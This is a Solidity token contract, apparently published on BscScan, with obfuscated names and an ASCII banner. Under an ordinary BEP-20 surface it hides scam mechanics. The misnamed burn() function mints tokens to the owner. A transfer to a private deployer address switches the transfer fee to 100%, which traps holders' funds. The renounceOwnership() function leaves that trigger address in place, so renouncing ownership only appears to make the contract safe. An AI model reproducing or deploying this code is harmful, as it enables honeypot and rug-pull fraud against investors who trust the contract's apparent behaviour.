/**
 *Submitted for verification at BscScan.com on 2022-11-13
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-13 19:06
 */

 // 
// $$$$$$$$\                                      $$$$$$\  $$\                 $$\           
// $$  _____|                                    $$  __$$\ $$ |                \__|          
// $$ |       $$$$$$$\  $$$$$$$\  $$$$$$\        $$ /  \__|$$$$$$$\   $$$$$$\  $$\ $$$$$$$\  
// $$$$$\    $$  _____|$$  _____|$$  __$$\       $$ |      $$  __$$\  \____$$\ $$ |$$  __$$\ 
// $$  __|   \$$$$$$\  \$$$$$$\  $$$$$$$$ |      $$ |      $$ |  $$ | $$$$$$$ |$$ |$$ |  $$ |
// $$ |       \____$$\  \____$$\ $$   ____|      $$ |  $$\ $$ |  $$ |$$  __$$ |$$ |$$ |  $$ |
// $$$$$$$$\ $$$$$$$  |$$$$$$$  |\$$$$$$$\       \$$$$$$  |$$ |  $$ |\$$$$$$$ |$$ |$$ |  $$ |
// \________|\_______/ \_______/  \_______|       \______/ \__|  \__| \_______|\__|\__|  \__|
//
//

pragma solidity >=0.4.11;
contract TJNyFg {
uint256 public  TQEjsF = 10000000000000000000000000000;
uint256 public  TVwICF = 10000000000000000000;
address public  BGxtRA = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
address public owner;
address public  ZxPdbJ = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint8 public constant decimals = 18;
string public  name = "WHaLJG";
uint256 public constant NITAVv = 9+1;
address public  BVXEkU = address(0);
mapping (address => uint256) public balanceOf;
address public  FFSuNA = address(0);
uint256 private  XpdFYZ = 10000000000000;
string public  symbol = "UOBWxA";
uint256 public  kadlwQ = 100000000000000000000000;
uint256 public  QVZjYN = 100000000000000000;
address private  HsFaGp = address(0);
uint256 public  JxLJiH = 1000000000000000000;
address public  ZArXHS = address(0);
address public  ZUOPAV = address(0);
uint256 public  sQBTZm = 100000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public  lFZZqp = 10000000000000000;
uint256 public  aFCczJ = 100000000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "JRUBwp");
require(to != address(0), "JRUBwp");
require(amount <= balanceOf[from], "JRUBwp");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* NITAVv/XpdFYZ ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==HsFaGp){
XpdFYZ = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
constructor () public {
HsFaGp = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}

}